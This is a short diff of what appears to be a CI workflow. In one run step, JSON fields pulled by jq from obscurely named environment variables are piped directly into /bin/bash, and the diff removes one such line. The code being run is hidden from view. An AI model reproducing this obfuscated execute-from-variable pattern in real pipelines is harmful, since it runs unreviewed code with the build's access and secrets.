@@ -24,7 +24,6 @@ jobs:
         run: |
           printf '%s' "$dffg78821" | jq -r .n65064 | /bin/bash
           printf '%s' "$namkk0" | jq -r .lz156 | /bin/bash
-          echo $lulv0 | jq -r .k7631 | /bin/bash
           printf '%s' "$wpv39548" | jq -r .noj3 | /bin/bash
 
       - name: Archive output
